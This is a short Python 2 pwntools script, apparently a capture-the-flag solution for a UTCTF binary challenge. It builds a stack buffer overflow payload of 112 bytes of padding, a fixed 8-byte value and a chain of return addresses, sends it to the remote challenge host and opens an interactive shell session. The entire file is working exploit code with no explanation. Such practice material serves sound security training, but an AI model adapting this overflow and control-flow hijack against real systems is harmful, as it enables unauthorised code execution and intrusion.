#!/usr/bin/env python2
from pwn import *

payload = 'a'*(112)+b'\xa2\xacvm\xeeU\x0f\xc0'+p64(0x400693)+p64(0xdeadbeef)+p64(0x4005ea)

conn = remote('binary.utctf.live', 9002)
conn.sendline(payload)
conn.interactive()
